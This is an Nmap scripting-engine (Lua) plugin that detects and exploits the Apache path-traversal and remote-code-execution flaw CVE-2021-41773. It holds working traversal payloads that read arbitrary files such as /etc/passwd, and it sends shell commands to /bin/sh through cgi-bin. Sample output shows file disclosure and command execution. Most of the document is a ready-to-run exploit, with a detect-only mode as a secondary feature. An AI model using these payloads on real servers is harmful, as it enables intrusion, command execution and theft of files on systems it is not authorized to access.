description = [[
  The Apache Web Server contains a RCE vulnerability. This script
  detects and exploits this vulnerability with RCE attack
  (execute commands) and local file disclosure.
]]

author = "Maurice LAMBERT <mauricelambert434@gmail.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"safe", "exploit", "intrusive", "vuln"}

---
-- @name
-- Apache RCE CVE-2021-41773 - Web Server Remote Code Execution
-- @author
-- Maurice LAMBERT <mauricelambert434@gmail.com>
-- @usage
-- nmap -p 80 --script RCE_CVE2021_41773 [--script-args "file=<file>" "command=<command>"] <target>
-- @output
-- ~# nmap -p 8080 --script RCE_CVE2021_41773 127.0.0.1  
-- PORT     STATE SERVICE
-- 8080/tcp open  http-proxy
-- | RCE_CVE2021_41773: 
-- |   CVE-2021-41773: 
-- |     title: Apache CVE-2021-41773 RCE
-- |     state: VULNERABLE (Exploitable)
-- |     ids: 
-- |       CVE:CVE-2021-41773
-- |     description: 
-- |       The Apache Web Server contains a RCE vulnerability. This
-- |       script detects and exploits this vulnerability with RCE
-- |       attack (execute commands) and local file disclosure.
-- |     dates: 
-- |       disclosure: 
-- |         day: 29
-- |         month: 09
-- |         year: 2021
-- |     disclosure: 2021-09-29
-- |     refs: 
-- |       https://nvd.nist.gov/vuln/detail/CVE-2021-41773
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
-- |_      https://github.com/mauricelambert/CVE-2021-41773
-- @output
-- ~# nmap -p 8080 --script RCE_CVE2021_41773 --script-args "file=/etc/passwd" 127.0.0.1
-- PORT     STATE SERVICE
-- 8080/tcp open  http-proxy
-- | RCE_CVE2021_41773: 
-- |   CVE-2021-41773: 
-- |     title: Apache CVE-2021-41773 RCE
-- |     state: VULNERABLE (Exploitable)
-- |     ids: 
-- |       CVE:CVE-2021-41773
-- |     description: 
-- |       The Apache Web Server contains a RCE vulnerability. This
-- |       script detects and exploits this vulnerability with RCE
-- |       attack (execute commands) and local file disclosure.
-- |     dates: 
-- |       disclosure: 
-- |         year: 2021
-- |         month: 09
-- |         day: 29
-- |     disclosure: 2021-09-29
-- |     refs: 
-- |       https://github.com/mauricelambert/CVE-2021-41773
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
-- |       https://nvd.nist.gov/vuln/detail/CVE-2021-41773
-- |     exploit output: 
-- |        
-- | root:x:0:0:root:/root:/bin/bash
-- | www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-- |_
-- @output
-- ~# nmap -p 8080 --script RCE_CVE2021_41773 --script-args "command=id" 127.0.0.1
-- PORT     STATE SERVICE
-- 8080/tcp open  http-proxy
-- | RCE_CVE2021_41773: 
-- |   CVE-2021-41773: 
-- |     title: Apache CVE-2021-41773 RCE
-- |     state: VULNERABLE (Exploitable)
-- |     ids: 
-- |       CVE:CVE-2021-41773
-- |     description: 
-- |       The Apache Web Server contains a RCE vulnerability. This
-- |       script detects and exploits this vulnerability with RCE
-- |       attack (execute commands) and local file disclosure.
-- |     dates: 
-- |       disclosure: 
-- |         year: 2021
-- |         month: 09
-- |         day: 29
-- |     disclosure: 2021-09-29
-- |     refs: 
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
-- |       https://github.com/mauricelambert/CVE-2021-41773
-- |       https://nvd.nist.gov/vuln/detail/CVE-2021-41773
-- |     exploit output: 
-- |        
-- | uid=33(www-data) gid=33(www-data) groups=33(www-data)
-- |_


local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"
local http = require "http"
local nmap = require "nmap"

local detect_only = false

portrule = shortport.http

local function get_payload()
  stdnse.debug2("Set payload...")


  local payload = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e"

  if (nmap.registry.args.command) then
    stdnse.debug2(
      "Argument command is detected..." ..
      nmap.registry.args.command
    )
    stdnse.print_verbose(
      "Mode: exploit RCE"
    )
    return "/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"
  elseif (nmap.registry.args.file) then
    stdnse.debug2(
      "Argument file is detected..." ..
      nmap.registry.args.file
    )
    stdnse.print_verbose(
      "Mode: exploit local file disclosure"
    )
    return payload .. nmap.registry.args.file
  end

  stdnse.debug2(
    "No arguments detected," ..
    " generate random filename..."
  )

  local value = "/"
  for j = 1, math.random(2, 5) do
  
    for i = 1, math.random(2, 5) do
      value = value .. string.char(math.random(97, 122))
    end
  
    payload = payload .. value .. "/"
    value = ""
  end

  stdnse.print_verbose(
    "Mode: detect only. No exploit."
  )
  detect_only = true
  return payload
end

action = function(host, port)
  local vuln = {
    title = "Apache CVE-2021-41773 RCE",
    state = vulns.STATE.NOT_VULN,
    IDS = { CVE = 'CVE-2021-41773' },
    description = [[The Apache Web Server contains a RCE vulnerability. This
      script detects and exploits this vulnerability with RCE
      attack (execute commands) and local file disclosure.]],
    references = {
       'https://nvd.nist.gov/vuln/detail/CVE-2021-41773',
       'https://github.com/mauricelambert/CVE-2021-41773',
     },
     dates = {
       disclosure = {year = '2021', month = '09', day = '29'},
     },
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  stdnse.print_verbose("Web service is up. Send payload...")
  stdnse.debug2("Send HTTP request.")

  local response

  if (nmap.registry.args.command) then
    response = http.post(
      host,
      port,
      get_payload(),
      {},
      nil,
      (
        "echo Content-Type: text/plain;echo;" ..
        nmap.registry.args.command
      )
    )
  else
    response = http.get(
      host,
      port,
      get_payload(),
      {}
    )
  end

  stdnse.debug2("Get HTTP response.")

  local exploit_result = nil
    
  if (response.status == 200 or
    response.status == 403 or
    response.status == 404
  ) then
    stdnse.debug2("Target is vulnerable.")
    stdnse.print_verbose("Target is vulnerable.")
    vuln.state = vulns.STATE.EXPLOIT

    if (detect_only == false and response.status == 200) then
      stdnse.debug2("Exploit is working.")
      stdnse.print_verbose("Exploit is working.")
      exploit_result = "\n" .. response.body .. "\n"
    elseif (detect_only == false and response.status == 403) then
      exploit_result = (
        "System is vulnerable but this " ..
        "exploit is not working (HTTP error 403)"
      )
      stdnse.debug2(
        "Exploit is not working (403 PermissionError)."
      )
      stdnse.print_verbose(
        "Exploit is not working (403 PermissionError)."
      )
    elseif (detect_only == false and response.status == 404) then
      exploit_result = (
        "System is vulnerable but this " ..
        "exploit is not working (HTTP error 404)"
      )
      stdnse.debug2(
        "Exploit is not working (404 Not Found)."
      )
      stdnse.print_verbose(
        "Exploit is not working (404 Not Found)."
      )
    end

  elseif (not (response.status == 400)) then
    vuln.state = vulns.STATE.UNKNOWN
    stdnse.debug2("Unknown status code.")
    stdnse.print_verbose("Unknown status code.")
  end

  local output = report:make_output(vuln)

  if (not (exploit_result == nil)) then
    output["CVE-2021-41773"]["exploit output"] = (
      "\n       " .. exploit_result
    )
  end

  return output
end
